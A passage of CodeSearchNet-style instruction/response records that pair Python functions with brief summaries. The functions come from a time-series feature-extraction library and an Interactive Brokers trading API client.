test_for_real_target_real_feature=test_for_real_target_real_feature,\n                            fdr_level=fdr_level, hypotheses_independent=hypotheses_independent,\n                            n_jobs=n_jobs,\n                            chunksize=chunksize,\n                            ml_task=ml_task)\n\n    if X is None:\n        X = X_sel\n    else:\n        X = pd.merge(X, X_sel, left_index=True, right_index=True, how=\"left\")\n\n    return X", "response": "This function extracts the relevant features from a timeseries_container and returns the matrix X with respect to target vector y."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsamples the tau of a bifurcation control parameter.", "response": "def sample_tau(n=10, kappa_3=0.3, ratio=0.5, rel_increase=0.15):\n    \"\"\"\n    Return list of control parameters\n\n    :param n: number of samples \n    :type n: int    \n    :param kappa_3: inverse bifurcation point\n    :type kappa_3: float\n    :param ratio: ratio (default 0.5) of samples before and beyond drift-bifurcation\n    :type ratio: float\n    :param rel_increase: relative increase from bifurcation point\n    :type rel_increase: float\n    :return: tau. List of sampled bifurcation parameter\n    :rtype tau: list\n    \"\"\"\n    assert ratio > 0 and ratio <= 1\n    assert kappa_3 > 0\n    assert rel_increase > 0 and rel_increase <= 1\n    tau_c = 1.0 / kappa_3\n\n    tau_max = tau_c * (1.0 + rel_increase)\n    tau = tau_c + (tau_max - tau_c) * (np.random.rand(n) - ratio)\n    return tau.tolist()"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nload a dissipative soliton with l time steps each for the m - dimensional velocity of a dissipative soliton and the target vector.", "response": "def load_driftbif(n, l, m=2, classification=True, kappa_3=0.3, seed=False):\n    \"\"\"\n    Simulates n time-series with l time steps each for the m-dimensional velocity of a dissipative soliton\n\n    classification=True:\n    target 0 means tau<=1/0.3, Dissipative Soliton with Brownian motion (purely noise driven)\n    target 1 means tau> 1/0.3, Dissipative Soliton with Active Brownian motion (intrinsiv velocity with overlaid noise)\n\n    classification=False:\n    target is bifurcation parameter tau\n\n    :param n: number of samples \n    :type n: int\n    :param l: length of the time series\n    :type l: int\n    :param m: number of spatial dimensions (default m=2) the dissipative soliton is propagating in\n    :type m: int\n    :param classification: distinguish between classification (default True) and regression target\n    :type classification: bool\n    :param kappa_3: inverse bifurcation parameter (default 0.3)\n    :type kappa_3: float\n    :param seed: random seed (default False)\n    :type seed: float\n    :return: X, y. Time series container and target vector\n    :rtype X: pandas.DataFrame\n    :rtype y: pandas.DataFrame\n    \"\"\"\n\n    # todo: add ratio of classes\n\n    if m > 2:\n        logging.warning(\"You set the dimension parameter for the dissipative soliton to m={}, however it is only\"\n                        \"properly defined for m=1 or m=2.\".format(m))\n\n    id = np.repeat(range(n), l * m)\n    dimensions = list(np.repeat(range(m), l)) * n\n\n    labels = list()\n    values = list()\n\n    ls_tau = sample_tau(n, kappa_3=kappa_3)\n\n    for i, tau in enumerate(ls_tau):\n        ds = velocity(tau=tau, kappa_3=kappa_3, seed=seed)\n        if classification:\n            labels.append(ds.label)\n        else:\n            labels.append(ds.tau)\n        values.append(ds.simulate(l, v0=np.zeros(m)).transpose().flatten())\n    time = np.stack([ds.delta_t * np.arange(l)] * n * m).flatten()\n\n    df = pd.DataFrame({'id': id, \"time\": time, \"value\": np.stack(values).flatten(), \"dimension\": dimensions})\n    y = pd.Series(labels)\n    y.index = range(n)\n\n    return df, y"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef impute(df_impute):\n    col_to_max, col_to_min, col_to_median = get_range_values_per_column(df_impute)\n    df_impute = impute_dataframe_range(df_impute, col_to_max, col_to_min, col_to_median)\n\n    # Ensure a type of \"np.float64\"\n    df_impute.astype(np.float64, copy=False)\n    return df_impute", "response": "This function imputes all NaNs and infs from the DataFrame df_impute with average and extreme values from\n   ."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef impute_dataframe_zero(df_impute):\n\n    df_impute.replace([np.PINF, np.NINF], 0, inplace=True)\n    df_impute.fillna(0, inplace=True)\n\n    # Ensure a type of \"np.float64\"\n    df_impute.astype(np.float64, copy=False)\n    return df_impute", "response": "Impute all NaNs - infs and + infs from the DataFrame df_impute with 0s."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn the finite max min and mean values per column in the DataFrame df.", "response": "def get_range_values_per_column(df):\n    \"\"\"\n    Retrieves the finite max, min and mean values per column in the DataFrame `df` and stores them in three\n    dictionaries. Those dictionaries `col_to_max`, `col_to_min`, `col_to_median` map the columnname to the maximal,\n    minimal or median value of that column.\n\n    If a column does not contain any finite values at all, a 0 is stored instead.\n\n    :param df: the Dataframe to get columnswise max, min and median from\n    :type df: pandas.DataFrame\n\n    :return: Dictionaries mapping column names to max, min, mean values\n    :rtype: (dict, dict, dict)\n    \"\"\"\n    data = df.get_values()\n    masked = np.ma.masked_invalid(data)\n    columns = df.columns\n\n    is_col_non_finite = masked.mask.sum(axis=0) == masked.data.shape[0]\n\n    if np.any(is_col_non_finite):\n        # We have columns that does not contain any finite value at all, so we will store 0 instead.\n        _logger.warning(\"The columns {} did not have any finite values. Filling with zeros.\".format(\n            df.iloc[:, np.where(is_col_non_finite)[0]].columns.values))\n\n        masked.data[:, is_col_non_finite] = 0  # Set the values of the columns to 0\n        masked.mask[:, is_col_non_finite] = False  # Remove the mask for this column\n\n    # fetch max, min and median for all columns\n    col_to_max = dict(zip(columns, np.max(masked, axis=0)))\n    col_to_min = dict(zip(columns, np.min(masked, axis=0)))\n    col_to_median = dict(zip(columns, np.ma.median(masked, axis=0)))\n\n    return col_to_max, col_to_min, col_to_median"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef restrict_input_to_index(df_or_dict, column_id, index):\n    if isinstance(df_or_dict, pd.DataFrame):\n        df_or_dict_restricted = df_or_dict[df_or_dict[column_id].isin(index)]\n    elif isinstance(df_or_dict, dict):\n        df_or_dict_restricted = {kind: df[df[column_id].isin(index)]\n                                 for kind, df in df_or_dict.items()}\n    else:\n        raise TypeError(\"df_or_dict should be of type dict or pandas.DataFrame\")\n\n    return df_or_dict_restricted", "response": "Restrict the input to those ids contained in index."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naggregate all ids in column_id from the time series container.", "response": "def get_ids(df_or_dict, column_id):\n    \"\"\"\n    Aggregates all ids in column_id from the time series container `\n\n    :param df_or_dict: a pandas DataFrame or a dictionary.\n    :type df_or_dict: pandas.DataFrame or dict\n    :param column_id: it must be present in the pandas DataFrame or in all DataFrames in the dictionary.\n        It is not allowed to have NaN values in this column.\n    :type column_id: basestring\n\n    :return: as set with all existing ids in energy_ratio_by_chunks\n    :rtype: Set\n    :raise: ``TypeError`` if df_or_dict is not of type dict or pandas.DataFrame\n    \"\"\"\n    if isinstance(df_or_dict, pd.DataFrame):\n        return set(df_or_dict[column_id])\n    elif isinstance(df_or_dict, dict):\n        return set.union(*[set(df[column_id]) for _, df in df_or_dict.items()])\n    else:\n        raise TypeError(\"df_or_dict should be of type dict or pandas.DataFrame\")"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nnormalizing any input to the internal representation of the time series.", "response": "def _normalize_input_to_internal_representation(timeseries_container, column_id, column_sort, column_kind, column_value):\n    \"\"\"\n    Try to transform any given input to the internal representation of time series, which is a flat DataFrame\n    (the first format from see :ref:`data-formats-label`).\n\n    This function can transform pandas DataFrames in different formats or dictionaries into the internal format\n    that we use. It should not be called by the user.\n\n    :param timeseries_container: a pandas DataFrame or a dictionary. The required shape/form of the object depends on\n        the rest of the passed arguments.\n    :type timeseries_container: pandas.DataFrame or dict\n    :param column_id: it must be present in the pandas DataFrame or in all DataFrames in the dictionary.\n        It is not allowed to have NaN values in this column.\n    :type column_id: basestring\n    :param column_sort: if not None, sort the rows by this column. It is not allowed to\n        have NaN values in this column.\n    :type column_sort: basestring or None\n    :param column_kind: It can only be used when passing a pandas DataFrame (the dictionary is already assumed to be\n        grouped by the kind). Is must be present in the DataFrame and no NaN values are allowed. The DataFrame\n        will be grouped by the values in the kind column and each group will be one entry in the resulting\n        mapping.\n        If the kind column is not passed, it is assumed that each column in the pandas DataFrame (except the id or\n        sort column) is a possible kind and the DataFrame is split up into as many DataFrames as there are columns.\n        It is not allowed to have a value column then.\n    :type column_kind: basestring or None\n    :param column_value: If it is given, it must be present and not-NaN on the pandas DataFrames (or all pandas\n        DataFrames in the dictionaries). If it is None, the kind column must also be none.\n    :type column_value: basestring or None\n\n    :return: A tuple of 4 elements: the normalized DataFrame, the name of the id column, the name of the value column\n             and the name of the value column\n    :rtype: (pd.DataFrame, basestring, basestring, basestring)\n    :raise: ``ValueError`` when the passed combination of parameters is wrong or does not fit to the input DataFrame\n            or dict.\n    \"\"\"\n    # Also make it possible to have a dict as an input\n    if isinstance(timeseries_container, dict):\n        if column_kind is not None:\n            raise ValueError(\"You passed in a dictionary and gave a column name for the kind. Both are not possible.\")\n\n        column_kind = \"_variables\"\n\n        timeseries_container = {key: df.copy() for key, df in timeseries_container.items()}\n\n        for kind, df in timeseries_container.items():\n            df[column_kind] = kind\n\n        timeseries_container = pd.concat(timeseries_container.values())\n        gc.collect()\n\n    # Check ID column\n    if column_id is None:\n        raise ValueError(\"You have to set the column_id which contains the ids of the different time series\")\n\n    if column_id not in timeseries_container.columns:\n        raise AttributeError(\"The given column for the id is not present in the data.\")\n\n    if timeseries_container[column_id].isnull().any():\n        raise ValueError(\"You have NaN values in your id column.\")\n\n    # Check sort column\n    if column_sort is not None:\n        if timeseries_container[column_sort].isnull().any():\n            raise ValueError(\"You have NaN values in your sort column.\")\n\n    # Check that either kind and value is None or both not None.\n    if column_kind is None and column_value is not None:\n        column_kind = \"_variables\"\n        timeseries_container = timeseries_container.copy()\n        timeseries_container[column_kind] = column_value\n    if column_kind is not None and column_value is None:\n        raise ValueError(\"If passing the kind, you also have to pass the value.\")\n\n    if column_kind is None and column_value is None:\n        if column_sort is not None:\n            column_kind = \"_variables\"\n            column_value = \"_values\"\n            sort = timeseries_container[column_sort].values\n            timeseries_container = pd.melt(timeseries_container.drop(column_sort, axis=1),\n                                           id_vars=[column_id],\n                                           value_name=column_value, var_name=column_kind)\n            timeseries_container[column_sort] = np.repeat(sort, (len(timeseries_container) // len(sort)))\n        else:\n            column_kind = \"_variables\"\n            column_value = \"_values\"\n            column_sort = \"_sort\"\n            sort = range(len(timeseries_container))\n            timeseries_container = pd.melt(timeseries_container, id_vars=[column_id],\n                                           value_name=column_value, var_name=column_kind)\n            timeseries_container[column_sort] = np.repeat(sort, (len(timeseries_container) // len(sort)))\n\n    # Check kind column\n    if column_kind not in timeseries_container.columns:\n        raise AttributeError(\"The given column for the kind is not present in the data.\")\n\n    if timeseries_container[column_kind].isnull().any():\n        raise ValueError(\"You have NaN values in your kind column.\")\n\n    # Check value column\n    if column_value not in timeseries_container.columns:\n        raise ValueError(\"The given column for the value is not present in the data.\")\n\n    if timeseries_container[column_value].isnull().any():\n        raise ValueError(\"You have NaN values in your value column.\")\n\n    if column_sort:\n        timeseries_container = timeseries_container.sort_values([column_id, column_kind, column_sort])\n        timeseries_container = timeseries_container.drop(column_sort, axis=1)\n    else:\n        timeseries_container = timeseries_container.sort_values([column_id, column_kind])\n\n    # The kind columns should always be of type \"str\" to make the inference of feature settings later in `from_columns`\n    # work\n    timeseries_container[column_kind] = timeseries_container[column_kind].astype(str)\n    return timeseries_container, column_id, column_kind, column_value"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ntaking a singular time series x and creates a DataFrame df and target vector y that can be used for a time series forecasting task.", "response": "def make_forecasting_frame(x, kind, max_timeshift, rolling_direction):\n    \"\"\"\n    Takes a singular time series x and constructs a DataFrame df and target vector y that can be used for a time series\n    forecasting task.\n\n    The returned df will contain, for every time stamp in x, the last max_timeshift data points as a new\n    time series, such can be used to fit a time series forecasting model.\n\n    See :ref:`forecasting-label` for a detailed description of the rolling process and how the feature matrix and target\n    vector are derived.\n\n    The returned time series container df, will contain the rolled time series as a flat data frame, the first format\n    from :ref:`data-formats-label`.\n\n    When x is a pandas.Series, the index will be used as id.\n\n    :param x: the singular time series\n    :type x: np.array or pd.Series\n    :param kind: the kind of the time series\n    :type kind: str\n    :param rolling_direction: The sign decides, if to roll backwards (if sign is positive) or forwards in \"time\"\n    :type rolling_direction: int\n    :param max_timeshift: If not None, shift only up to max_timeshift. If None, shift as often as possible.\n    :type max_timeshift: int\n\n    :return: time series container df, target vector y\n    :rtype: (pd.DataFrame, pd.Series)\n    \"\"\"\n    n = len(x)\n\n    if isinstance(x, pd.Series):\n        t = x.index\n    else:\n        t = range(n)\n\n    df = pd.DataFrame({\"id\": [\"id\"] * n,\n                       \"time\": t,\n                       \"value\": x,\n                       \"kind\": kind})\n\n    df_shift = roll_time_series(df,\n                                column_id=\"id\",\n                                column_sort=\"time\",\n                                column_kind=\"kind\",\n                                rolling_direction=rolling_direction,\n                                max_timeshift=max_timeshift)\n\n    # drop the rows which should actually be predicted\n    def mask_first(x):\n        \"\"\"\n        this mask returns an array of 1s where the last entry is a 0\n        \"\"\"\n        result = np.ones(len(x))\n        result[-1] = 0\n        return result\n\n    mask = df_shift.groupby(['id'])['id'].transform(mask_first).astype(bool)\n    df_shift = df_shift[mask]\n\n    return df_shift, df[\"value\"][1:]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef select_features(X, y, test_for_binary_target_binary_feature=defaults.TEST_FOR_BINARY_TARGET_BINARY_FEATURE,\n                    test_for_binary_target_real_feature=defaults.TEST_FOR_BINARY_TARGET_REAL_FEATURE,\n                    test_for_real_target_binary_feature=defaults.TEST_FOR_REAL_TARGET_BINARY_FEATURE,\n                    test_for_real_target_real_feature=defaults.TEST_FOR_REAL_TARGET_REAL_FEATURE,\n                    fdr_level=defaults.FDR_LEVEL, hypotheses_independent=defaults.HYPOTHESES_INDEPENDENT,\n                    n_jobs=defaults.N_PROCESSES, chunksize=defaults.CHUNKSIZE,\n                    ml_task='auto'):\n    \"\"\"\n    Check the significance of all features (columns) of feature matrix X and return a possibly reduced feature matrix\n    only containing relevant features.\n\n    The feature matrix must be a pandas.DataFrame in the format:\n\n        +-------+-----------+-----------+-----+-----------+\n        | index | feature_1 | feature_2 | ... | feature_N |\n        +=======+===========+===========+=====+===========+\n        | A     | ...       | ...       | ... | ...       |\n        +-------+-----------+-----------+-----+-----------+\n        | B     | ...       | ...       | ... | ...       |\n        +-------+-----------+-----------+-----+-----------+\n        | ...   | ...       | ...       | ... | ...       |\n        +-------+-----------+-----------+-----+-----------+\n        | ...   | ...       | ...       | ... | ...       |\n        +-------+-----------+-----------+-----+-----------+\n        | ...   | ...       | ...       | ... | ...       |\n        +-------+-----------+-----------+-----+-----------+\n\n\n    Each column will be handled as a feature and tested for its significance to the target.\n\n    The target vector must be a pandas.Series or numpy.array in the form\n\n        +-------+--------+\n        | index | target |\n        +=======+========+\n        | A     | ...    |\n        +-------+--------+\n        | B     | ...    |\n        +-------+--------+\n        | .     | ...    |\n        +-------+--------+\n        | .     | ...    |\n        +-------+--------+\n\n    and must contain all id's that are in the feature matrix. If y is a numpy.array without index, it is assumed\n    that y has the same order and length than X and the rows correspond to each other.\n\n    Examples\n    ========\n\n    >>> from tsfresh.examples import load_robot_execution_failures\n    >>> from tsfresh import extract_features, select_features\n    >>> df, y = load_robot_execution_failures()\n    >>> X_extracted = extract_features(df, column_id='id', column_sort='time')\n    >>> X_selected = select_features(X_extracted, y)\n\n    :param X: Feature matrix in the format mentioned before which will be reduced to only the relevant features.\n              It can contain both binary or real-valued features at the same time.\n    :type X: pandas.DataFrame\n\n    :param y: Target vector which is needed to test which features are relevant. Can be binary or real-valued.\n    :type y: pandas.Series or numpy.ndarray\n\n    :param test_for_binary_target_binary_feature: Which test to be used for binary target, binary feature (currently unused)\n    :type test_for_binary_target_binary_feature: str\n\n    :param test_for_binary_target_real_feature: Which test to be used for binary target, real feature\n    :type test_for_binary_target_real_feature: str\n\n    :param test_for_real_target_binary_feature: Which test to be used for real target, binary feature (currently unused)\n    :type test_for_real_target_binary_feature: str\n\n    :param test_for_real_target_real_feature: Which test to be used for real target, real feature (currently unused)\n    :type test_for_real_target_real_feature: str\n\n    :param fdr_level: The FDR level that should be respected, this is the theoretical expected percentage of irrelevant\n                      features among all created features.\n    :type fdr_level: float\n\n    :param hypotheses_independent: Can the significance of the features be assumed to be independent?\n                                   Normally, this should be set to False as the features are never\n                                   independent (e.g. mean and median)\n    :type hypotheses_independent: bool\n\n    :param n_jobs: Number of processes to use during the p-value calculation\n    :type n_jobs: int\n\n    :param chunksize: The size of one chunk that is submitted to the worker\n        process for the parallelisation.  Where one chunk is defined as a\n        singular time series for one id and one kind. If you set the chunksize\n        to 10, then it means that one task is to calculate all features for 10\n        time series.  If it is set it to None, depending on distributor,\n        heuristics are used to find the optimal chunksize. If you get out of\n        memory exceptions, you can try it with the dask distributor and a\n        smaller chunksize.\n    :type chunksize: None or int\n\n    :param ml_task: The intended machine learning task. Either `'classification'`, `'regression'` or `'auto'`.\n                    Defaults to `'auto'`, meaning the intended task is inferred from `y`.\n                    If `y` has a boolean, integer or object dtype, the task is assumend to be classification,\n                    else regression.\n    :type ml_task: str\n\n    :return: The same DataFrame as X, but possibly with reduced number of columns ( = features).\n    :rtype: pandas.DataFrame\n\n    :raises: ``ValueError`` when the target vector does not fit to the feature matrix\n             or `ml_task` is not one of `'auto'`, `'classification'` or `'regression'`.\n    \"\"\"\n    assert isinstance(X, pd.DataFrame), \"Please pass features in X as pandas.DataFrame.\"\n    check_for_nans_in_columns(X)\n    assert isinstance(y, (pd.Series, np.ndarray)), \"The type of target vector y must be one of: \" \\\n                                                   \"pandas.Series, numpy.ndarray\"\n    assert len(y) > 1, \"y must contain at least two samples.\"\n    assert len(X) == len(y), \"X and y must contain the same number of samples.\"\n    assert len(set(y)) > 1, \"Feature selection is only possible if more than 1 label/class is provided\"\n\n    if isinstance(y, pd.Series) and set(X.index) != set(y.index):\n        raise ValueError(\"Index of X and y must be identical if provided\")\n\n    if isinstance(y, np.ndarray):\n        y = pd.Series(y, index=X.index)\n\n    relevance_table = calculate_relevance_table(\n        X, y, ml_task=ml_task, n_jobs=n_jobs, chunksize=chunksize,\n        test_for_binary_target_real_feature=test_for_binary_target_real_feature,\n        fdr_level=fdr_level, hypotheses_independent=hypotheses_independent,\n    )\n\n    relevant_features = relevance_table[relevance_table.relevant].feature\n\n    return X.loc[:, relevant_features]", "response": "Select features from a matrix X and a vector y."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef connect(\n            self, host: str = '127.0.0.1', port: int = 7497,\n            clientId: int = 1, timeout: float = 2):\n        \"\"\"\n        Connect to a running TWS or IB gateway application.\n        After the connection is made the client is fully synchronized\n        and ready to serve requests.\n\n        This method is blocking.\n\n        Args:\n            host: Host name or IP address.\n            port: Port number.\n            clientId: ID number to use for this client; must be unique per\n                connection. Setting clientId=0 will automatically merge manual\n                TWS trading with this client.\n            timeout: If establishing the connection takes longer than\n                ``timeout`` seconds then the ``asyncio.TimeoutError`` exception\n                is raised. Set to 0 to disable timeout.\n        \"\"\"\n        return self._run(self.connectAsync(host, port, clientId, timeout))", "response": "Connects to a running TWS or IB gateway application."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef disconnect(self):\n        if not self.client.isConnected():\n            return\n        stats = self.client.connectionStats()\n        self._logger.info(\n            f'Disconnecting from {self.client.host}:{self.client.port}, '\n            f'{util.formatSI(stats.numBytesSent)}B sent '\n            f'in {stats.numMsgSent} messages, '\n            f'{util.formatSI(stats.numBytesRecv)}B received '\n            f'in {stats.numMsgRecv} messages, '\n            f'session time {util.formatSI(stats.duration)}s.')\n        self.client.disconnect()", "response": "Disconnect from a TWS or IB gateway application."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef waitOnUpdate(self, timeout: float = 0) -> bool:\n        if timeout:\n            with suppress(asyncio.TimeoutError):\n                util.run(asyncio.wait_for(self.updateEvent, timeout))\n        else:\n            util.run(self.updateEvent)\n        return True", "response": "Wait on any new update to arrive from the network."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef loopUntil(\n            self, condition=None, timeout: float = 0) -> Iterator[object]:\n        \"\"\"\n        Iterate until condition is met, with optional timeout in seconds.\n        The yielded value is that of the condition or False when timed out.\n\n        Args:\n            condition: Predicate function that is tested after every network\n            update.\n            timeout: Maximum time in seconds to wait.\n                If 0 then no timeout is used.\n        \"\"\"\n        endTime = time.time() + timeout\n        while True:\n            test = condition and condition()\n            if test:\n                yield test\n                return\n            elif timeout and time.time() > endTime:\n                yield False\n                return\n            else:\n                yield test\n            self.waitOnUpdate(endTime - time.time() if timeout else 0)", "response": "Iterate until condition is met."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nreturning a list of account values for the given account.", "response": "def accountValues(self, account: str = '') -> List[AccountValue]:\n        \"\"\"\n        List of account values for the given account,\n        or of all accounts if account is left blank.\n\n        Args:\n            account: If specified, filter for this account name.\n        \"\"\"\n        if account:\n            return [v for v in self.wrapper.accountValues.values()\n                    if v.account == account]\n        else:\n            return list(self.wrapper.accountValues.values())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nreturn a list of account values for the given account.", "response": "def accountSummary(self, account: str = '') -> List[AccountValue]:\n        \"\"\"\n        List of account values for the given account,\n        or of all accounts if account is left blank.\n\n        This method is blocking on first run, non-blocking after that.\n\n        Args:\n            account: If specified, filter for this account name.\n        \"\"\"\n        if not self.wrapper.acctSummary:\n            # loaded on demand since it takes ca. 250 ms\n            self.reqAccountSummary()\n        if account:\n            return [v for v in self.wrapper.acctSummary.values()\n                    if v.account == account]\n        else:\n            return list(self.wrapper.acctSummary.values())"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nreturning a list of portfolio items of the default account.", "response": "def portfolio(self) -> List[PortfolioItem]:\n        \"\"\"\n        List of portfolio items of the default account.\n        \"\"\"\n        account = self.wrapper.accounts[0]\n        return [v for v in self.wrapper.portfolio[account].values()]"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef positions(self, account: str = '') -> List[Position]:\n        if account:\n            return list(self.wrapper.positions[account].values())\n        else:\n            return [v for d in self.wrapper.positions.values()\n                    for v in d.values()]", "response": "Returns a list of positions for the given account."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nreturns a list of all PnL objects subscribed to the given account and modelCode.", "response": "def pnl(self, account='', modelCode='') -> List[PnL]:\n        \"\"\"\n        List of subscribed :class:`.PnL` objects (profit and loss),\n        optionally filtered by account and/or modelCode.\n\n        The :class:`.PnL` objects are kept live updated.\n\n        Args:\n            account: If specified, filter for this account name.\n            modelCode: If specified, filter for this account model.\n        \"\"\"\n        return [v for v in self.wrapper.pnls.values() if\n                (not account or v.account == account) and\n                (not modelCode or v.modelCode == modelCode)]"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns a list of all single PnLSingles subscribed to the given account.", "response": "def pnlSingle(\n            self, account: str = '', modelCode: str = '',\n            conId: int = 0) -> List[PnLSingle]:\n        \"\"\"\n        List of subscribed :class:`.PnLSingle` objects (profit and loss for\n        single positions).\n\n        The :class:`.PnLSingle` objects are kept live updated.\n\n        Args:\n            account: If specified, filter for this account name.\n            modelCode: If specified, filter for this account model.\n            conId: If specified, filter for this contract ID.\n        \"\"\"\n        return [v for v in self.wrapper.pnlSingles.values() if\n                (not account or v.account == account) and\n                (not modelCode or v.modelCode == modelCode) and\n                (not conId or v.conId == conId)]"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef openTrades(self) -> List[Trade]:\n        return [v for v in self.wrapper.trades.values()\n                if v.orderStatus.status not in OrderStatus.DoneStates]", "response": "List of all open order trades."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nlist of all orders from this session.", "response": "def orders(self) -> List[Order]:\n        \"\"\"\n        List of all orders from this session.\n        \"\"\"\n        return list(\n            trade.order for trade in self.wrapper.trades.values())"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef openOrders(self) -> List[Order]:\n        return [trade.order for trade in self.wrapper.trades.values()\n                if trade.orderStatus.status not in OrderStatus.DoneStates]", "response": "List of all open orders."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef executions(self) -> List[Execution]:\n        return list(fill.execution for fill in self.wrapper.fills.values())", "response": "List of all executions from this session."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the ticker for the given contract.", "response": "def ticker(self, contract: Contract) -> Ticker:\n        \"\"\"\n        Get ticker of the given contract. It must have been requested before\n        with reqMktData with the same contract object. The ticker may not be\n        ready yet if called directly after :meth:`.reqMktData`.\n\n        Args:\n            contract: Contract to get ticker for.\n        \"\"\"\n        return self.wrapper.tickers.get(id(contract))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nrequesting and return a list of snapshot tickers.", "response": "def reqTickers(\n            self, *contracts: List[Contract],\n            regulatorySnapshot: bool = False) -> List[Ticker]:\n        \"\"\"\n        Request and return a list of snapshot tickers.\n        The list is returned when all tickers are ready.\n\n        This method is blocking.\n\n        Args:\n            contracts: Contracts to get tickers for.\n            regulatorySnapshot: Request NBBO snapshots (may incur a fee).\n        \"\"\"\n        return self._run(\n            self.reqTickersAsync(\n                *contracts, regulatorySnapshot=regulatorySnapshot))"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef qualifyContracts(self, *contracts: List[Contract]) -> List[Contract]:\n        return self._run(self.qualifyContractsAsync(*contracts))", "response": "Fully qualify the given contracts in - place."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\ncreate a bracket order that is bracketed by a take - profit order and a stop - loss order.", "response": "def bracketOrder(\n            self, action: str, quantity: float,\n            limitPrice: float, takeProfitPrice: float,\n            stopLossPrice: float, **kwargs) -> BracketOrder:\n        \"\"\"\n        Create a limit order that is bracketed by a take-profit order and\n        a stop-loss order. Submit the bracket like:\n\n        .. code-block:: python\n\n            for o in bracket:\n                ib.placeOrder(contract, o)\n\n        https://interactivebrokers.github.io/tws-api/bracket_order.html\n\n        Args:\n            action: 'BUY' or 'SELL'.\n            quantity: Size of order.\n            limitPrice: Limit price of entry order.\n            takeProfitPrice: Limit price of profit order.\n            stopLossPrice: Stop price of loss order.\n        \"\"\"\n        assert action in ('BUY', 'SELL')\n        reverseAction = 'BUY' if action == 'SELL' else 'SELL'\n        parent = LimitOrder(\n            action, quantity, limitPrice,\n            orderId=self.client.getReqId(),\n            transmit=False,\n            **kwargs)\n        takeProfit = LimitOrder(\n            reverseAction, quantity, takeProfitPrice,\n            orderId=self.client.getReqId(),\n            transmit=False,\n            parentId=parent.orderId,\n            **kwargs)\n        stopLoss = StopOrder(\n            reverseAction, quantity, stopLossPrice,\n            orderId=self.client.getReqId(),\n            transmit=True,\n            parentId=parent.orderId,\n            **kwargs)\n        return BracketOrder(parent, takeProfit, stopLoss)"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nplacing the trades in the same One Cancels All ( OCA group.", "response": "def oneCancelsAll(\n            orders: List[Order], ocaGroup: str, ocaType: int) -> List[Order]:\n        \"\"\"\n        Place the trades in the same One Cancels All (OCA) group.\n\n        https://interactivebrokers.github.io/tws-api/oca.html\n\n        Args:\n            orders: The orders that are to be placed together.\n        \"\"\"\n        for o in orders:\n            o.ocaGroup = ocaGroup\n            o.ocaType = ocaType\n        return orders"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef whatIfOrder(self, contract: Contract, order: Order) -> OrderState:\n        return self._run(self.whatIfOrderAsync(contract, order))", "response": "Retrieve commission and margin impact without actually\n        placing the order."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef placeOrder(self, contract: Contract, order: Order) -> Trade:\n        orderId = order.orderId or self.client.getReqId()\n        self.client.placeOrder(orderId, contract, order)\n        now = datetime.datetime.now(datetime.timezone.utc)\n        key = self.wrapper.orderKey(\n            self.wrapper.clientId, orderId, order.permId)\n        trade = self.wrapper.trades.get(key)\n        if trade:\n            # this is a modification of an existing order\n            assert trade.orderStatus.status not in OrderStatus.DoneStates\n            logEntry = TradeLogEntry(now, trade.orderStatus.status, 'Modify')\n            trade.log.append(logEntry)\n            self._logger.info(f'placeOrder: Modify order {trade}')\n            trade.modifyEvent.emit(trade)\n            self.orderModifyEvent.emit(trade)\n        else:\n            # this is a new order\n            order.clientId = self.wrapper.clientId\n            order.orderId = orderId\n            orderStatus = OrderStatus(status=OrderStatus.PendingSubmit)\n            logEntry = TradeLogEntry(now, orderStatus.status, '')\n            trade = Trade(\n                contract, order, orderStatus, [], [logEntry])\n            self.wrapper.trades[key] = trade\n            self._logger.info(f'placeOrder: New order {trade}')\n            self.newOrderEvent.emit(trade)\n        return trade", "response": "Place a new order or modify an existing order."}
